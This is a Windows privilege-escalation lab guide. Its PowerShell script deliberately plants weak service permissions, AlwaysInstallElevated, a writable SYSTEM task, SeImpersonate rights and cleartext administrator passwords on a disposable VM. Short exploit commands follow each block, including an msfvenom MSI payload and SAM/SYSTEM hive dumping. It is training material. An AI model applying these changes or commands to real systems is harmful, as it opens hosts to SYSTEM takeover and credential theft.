# Windows Privilege Escalation Lab Setup

A single PowerShell script that turns one Windows VM into a practice range for every technique in this module — unquoted service paths, weak service permissions, `AlwaysInstallElevated`, autoruns, a writable scheduled task, `SeImpersonatePrivilege`, Backup Operators membership, and a spread of stored credentials. Run it once as administrator on a disposable VM, log in as the low-privileged `lowpriv` account it creates, and work through the technique notes against a target you fully control.

> [!warning]
> **Isolated lab only — this deliberately weakens the machine**
> Every block below intentionally introduces a real vulnerability. Run it **only on a snapshotted VM you own**, on an isolated network, never on a production or shared host. Take a snapshot first so you can revert instantly; the teardown script reverts most changes but a snapshot is the reliable reset.

## Requirements

- Windows 10/11 or Server 2019/2022 VM you own, **snapshotted**.
- An elevated PowerShell session (`#Requires -RunAsAdministrator`).
- The script creates a low-privileged account **`lowpriv` / `Lab_P@ss123`** to practise from — log in as it (or `runas`) after provisioning.

## 0. Preamble and low-privileged user

```powershell
#Requires -RunAsAdministrator
$ErrorActionPreference = 'Continue'
$LabRoot = 'C:\PrivEscLab'
New-Item -ItemType Directory -Force -Path $LabRoot | Out-Null

# Low-privileged practice account
$pw = ConvertTo-SecureString 'Lab_P@ss123' -AsPlainText -Force
if (-not (Get-LocalUser -Name lowpriv -ErrorAction SilentlyContinue)) {
    New-LocalUser -Name lowpriv -Password $pw -FullName 'Low Priv' -Description 'PrivEsc lab account' | Out-Null
    Add-LocalGroupMember -Group 'Users' -Member lowpriv
}
```

## 1. Unquoted service path

Sets up a service whose binary path contains spaces and is stored **unquoted** (`New-Service` does not add quotes), with a writable intermediate directory so a low-priv user can drop `C:\Vuln Services\Sub.exe`. → [Unquoted Service Path Vulnerability](../Services-Exploitation/Unquoted-Service-Path-Vulnerability.md)

```powershell
$svcDir = 'C:\Vuln Services\Sub Dir'
New-Item -ItemType Directory -Force -Path $svcDir | Out-Null
Copy-Item C:\Windows\System32\cmd.exe "$svcDir\service.exe" -Force
New-Service -Name VulnUnquoted -BinaryPathName 'C:\Vuln Services\Sub Dir\service.exe' -StartupType Manual | Out-Null
icacls 'C:\Vuln Services' /grant 'Users:(OI)(CI)(M)' | Out-Null   # writable intermediate path
```

**Exploit:** drop a payload at `C:\Vuln Services\Sub.exe`, then `sc start VulnUnquoted`.

## 2. Weak service permissions (binPath)

Grants **Authenticated Users** `SERVICE_CHANGE_CONFIG` via a vulnerable SDDL, so a low-priv user can rewrite the service's `binPath`. → [Insecure Service Permissions(binPath)](../Services-Exploitation/Insecure-Service-Permissions(binPath).md)

```powershell
New-Service -Name daclsvc -BinaryPathName 'C:\Windows\System32\cmd.exe /c exit' -StartupType Manual | Out-Null
sc.exe sdset daclsvc "D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCLCSWRPWPDTLOCRRC;;;AU)" | Out-Null
```

**Exploit:** `sc config daclsvc binpath= "C:\PrivEscLab\payload.exe"` then `sc start daclsvc`.

## 3. Insecure service binary file permissions

The service's executable is writable by `Users`, so it can be overwritten with a payload. → [Insecure File Permissions Service Executable Files Path](../Services-Exploitation/Insecure-File-Permissions-Service-Executable-Files-Path.md)

```powershell
$fp = 'C:\PrivEscLab\filepermsvc'
New-Item -ItemType Directory -Force -Path $fp | Out-Null
Copy-Item C:\Windows\System32\cmd.exe "$fp\filepermservice.exe" -Force
New-Service -Name filepermsvc -BinaryPathName "$fp\filepermservice.exe" -StartupType Manual | Out-Null
icacls "$fp\filepermservice.exe" /grant 'Users:(F)' | Out-Null
```

**Exploit:** overwrite `filepermservice.exe` with a payload, then start the service.

## 4. AlwaysInstallElevated

Enables the machine-wide policy so any `.msi` installs as SYSTEM. → [AlwaysInstallElevated Exploitation](../Registry-Exploitation/AlwaysInstallElevated-Exploitation.md)

```powershell
New-Item -Path 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Force | Out-Null
Set-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\Installer' AlwaysInstallElevated 1
```

> [!note]
> Exploitation needs **both** the HKLM value above (machine, set here) **and** the matching `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1` in the *attacking* user's hive. As `lowpriv` (HKCU is user-writable, no privilege needed) run:
> ```powershell
> New-Item 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Force | Out-Null
> Set-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer' AlwaysInstallElevated 1
> ```
> **Exploit:** `msfvenom -p windows/x64/exec CMD='...' -f msi -o evil.msi`, then `msiexec /quiet /qn /i evil.msi`.

## 5. Autorun (writable target)

An admin-logon Run entry points to a `Users`-writable binary. → [Autorun Registry Persistence](../Registry-Exploitation/Autorun-Registry-Persistence.md)

```powershell
$ar = 'C:\Program Files\Autorun Program'
New-Item -ItemType Directory -Force -Path $ar | Out-Null
Copy-Item C:\Windows\System32\cmd.exe "$ar\program.exe" -Force
Set-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' 'My Program' "`"$ar\program.exe`""
icacls "$ar" /grant 'Users:(OI)(CI)(F)' | Out-Null
```

**Exploit:** overwrite `program.exe` with a payload; it runs when an administrator logs on.

## 6. Writable scheduled task (runs as SYSTEM)

A SYSTEM task executes a `Users`-writable batch file every minute. → [Privilege Escalation via Scheduled Tasks](../Privilege-Escalation-via-Scheduled-Tasks.md)

```powershell
$td = 'C:\PrivEscLab\schedtask'
New-Item -ItemType Directory -Force -Path $td | Out-Null
Set-Content "$td\task.bat" 'rem lab task'
icacls "$td\task.bat" /grant 'Users:(F)' | Out-Null
schtasks /create /tn VulnTask /tr "cmd /c $td\task.bat" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f | Out-Null
```

**Exploit:** append a payload command to `task.bat`; it runs as SYSTEM on the next tick.

## 7. SeImpersonatePrivilege for the low-priv user

Grants `lowpriv` the privilege that potato attacks abuse (normally held by service accounts). → [Impersonation and Potato Attacks](../Impersonation-and-Potato-Attacks/Impersonation-and-Potato-Attacks.md) · [Token Privilege Abuse](../Token-Privilege-Abuse/Token-Privilege-Abuse.md)

```powershell
$sid = (Get-LocalUser lowpriv).SID.Value
secedit /export /cfg "$LabRoot\secpol.cfg" | Out-Null
(Get-Content "$LabRoot\secpol.cfg") -replace '^(SeImpersonatePrivilege = .*)$', "`$1,*$sid" |
    Set-Content "$LabRoot\secpol.cfg"
secedit /configure /db C:\Windows\security\local.sdb /cfg "$LabRoot\secpol.cfg" /areas USER_RIGHTS | Out-Null
```

**Exploit (as `lowpriv`, after re-login):** `whoami /priv` shows `SeImpersonatePrivilege`; run [PrintSpoofer](../Impersonation-and-Potato-Attacks/PrintSpoofer.md) / [God Potato](../Impersonation-and-Potato-Attacks/God-Potato.md) → SYSTEM.

## 8. Backup Operators membership (SeBackup / SeRestore)

Puts `lowpriv` in Backup Operators so it can read protected hives. → [Backup Operators](../Windows-Built-in-Groups/Backup-Operators.md)

```powershell
Add-LocalGroupMember -Group 'Backup Operators' -Member lowpriv -ErrorAction SilentlyContinue
```

**Exploit (as `lowpriv`):** `reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM`, then `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`.

## 9. Stored credentials to mine

Seeds several credential sources for the [Password Mining](../Password-Mining/Password-Mining.md) techniques. → [Password in Windows Registry](../Password-Mining/Password-in-Windows-Registry.md), [Unattended Install Files(Cleartext Passwords)](../Password-Mining/Unattended-Install-Files(Cleartext-Passwords).md), [PowerShell Command History](../Password-Mining/PowerShell-Command-History.md)

```powershell
# 9a. Autologon credentials in the registry
$wl = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
Set-ItemProperty $wl DefaultUserName 'administrator'
Set-ItemProperty $wl DefaultPassword 'Lab_P@ss123'
Set-ItemProperty $wl AutoAdminLogon '1'

# 9b. Unattended install file with a cleartext password
New-Item -ItemType Directory -Force 'C:\Windows\Panther' | Out-Null
@'
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
  <settings pass="oobeSystem">
    <component name="Microsoft-Windows-Shell-Setup">
      <AutoLogon>
        <Username>administrator</Username>
        <Enabled>true</Enabled>
        <Password><Value>Lab_P@ss123</Value><PlainText>true</PlainText></Password>
      </AutoLogon>
    </component>
  </settings>
</unattend>
'@ | Set-Content 'C:\Windows\Panther\Unattend.xml'

# 9c. Saved credential in Credential Manager
cmdkey /generic:LAB-DC /user:administrator /pass:Lab_P@ss123 | Out-Null

# 9d. Credential left in PowerShell history
$hist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
New-Item -ItemType Directory -Force (Split-Path $hist) | Out-Null
Add-Content $hist 'net use \\LAB-DC\share /user:administrator Lab_P@ss123'
```

## Verification

Confirm the range is armed (some checks must run **as `lowpriv`** after re-login):

```powershell
# Services (as admin)
Get-CimInstance Win32_Service | Where-Object { $_.Name -in 'VulnUnquoted','daclsvc','filepermsvc' } |
    Format-Table Name, PathName, StartMode -Auto

# As lowpriv:
whoami /priv        # expect SeImpersonatePrivilege (and SeBackup via group)
whoami /groups      # expect BUILTIN\Backup Operators
reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
schtasks /query /tn VulnTask /v /fo LIST | findstr /i "Run As User Task To Run"
```

## Lab matrix

| Seeded weakness | Practise with | Quick exploit |
|-----------------|---------------|---------------|
| `VulnUnquoted` service | [Unquoted Service Path Vulnerability](../Services-Exploitation/Unquoted-Service-Path-Vulnerability.md) | drop `C:\Vuln Services\Sub.exe` → `sc start` |
| `daclsvc` weak SDDL | [Insecure Service Permissions(binPath)](../Services-Exploitation/Insecure-Service-Permissions(binPath).md) | `sc config daclsvc binpath=` |
| `filepermsvc` writable exe | [Insecure File Permissions Service Executable Files Path](../Services-Exploitation/Insecure-File-Permissions-Service-Executable-Files-Path.md) | overwrite the binary |
| AlwaysInstallElevated | [AlwaysInstallElevated Exploitation](../Registry-Exploitation/AlwaysInstallElevated-Exploitation.md) | `msiexec /i evil.msi` |
| Autorun writable target | [Autorun Registry Persistence](../Registry-Exploitation/Autorun-Registry-Persistence.md) | overwrite `program.exe` |
| `VulnTask` (SYSTEM) | [Privilege Escalation via Scheduled Tasks](../Privilege-Escalation-via-Scheduled-Tasks.md) | append to `task.bat` |
| SeImpersonate on `lowpriv` | [Impersonation and Potato Attacks](../Impersonation-and-Potato-Attacks/Impersonation-and-Potato-Attacks.md) · [PrintSpoofer](../Impersonation-and-Potato-Attacks/PrintSpoofer.md) | potato → SYSTEM |
| Backup Operators | [Backup Operators](../Windows-Built-in-Groups/Backup-Operators.md) | `reg save` SAM/SYSTEM |
| Stored credentials | [Password Mining](../Password-Mining/Password-Mining.md) | registry / unattend / cmdkey / PS history |

## Teardown

Reverts the seeded changes. For `SeImpersonatePrivilege` and any ACL you are unsure about, **restore the VM snapshot** — it is the only guaranteed reset.

```powershell
'VulnUnquoted','daclsvc','filepermsvc' | ForEach-Object { sc.exe delete $_ | Out-Null }
schtasks /delete /tn VulnTask /f 2>$null
Remove-Item -Recurse -Force 'C:\PrivEscLab','C:\Vuln Services','C:\Program Files\Vuln App','C:\Program Files\Autorun Program' -ErrorAction SilentlyContinue
Remove-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' 'My Program' -ErrorAction SilentlyContinue
Remove-Item 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Recurse -ErrorAction SilentlyContinue
$wl = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
'DefaultUserName','DefaultPassword','AutoAdminLogon' | ForEach-Object { Remove-ItemProperty $wl $_ -ErrorAction SilentlyContinue }
Remove-Item 'C:\Windows\Panther\Unattend.xml' -ErrorAction SilentlyContinue
cmdkey /delete:LAB-DC | Out-Null
Remove-LocalGroupMember -Group 'Backup Operators' -Member lowpriv -ErrorAction SilentlyContinue
Remove-LocalUser -Name lowpriv -ErrorAction SilentlyContinue
```

## Related
- [Windows Privilege Escalation](../README.md) — category MOC this lab exercises end to end
- [Escalate My Privilege Windows](../Escalate-My-Privilege-Windows.md) — the methodology to work the seeded box with
- [SeImpersonate Potato to SYSTEM](SeImpersonate-Potato-to-SYSTEM.md) · [Windows Unquoted Service Path to SYSTEM](Windows-Unquoted-Service-Path-to-SYSTEM.md) — guided walkthroughs against these conditions
- [Privilege Escalation Tools](../Privilege-Escalation-Tools.md) — run WinPEAS/PowerUp to auto-discover everything this seeds
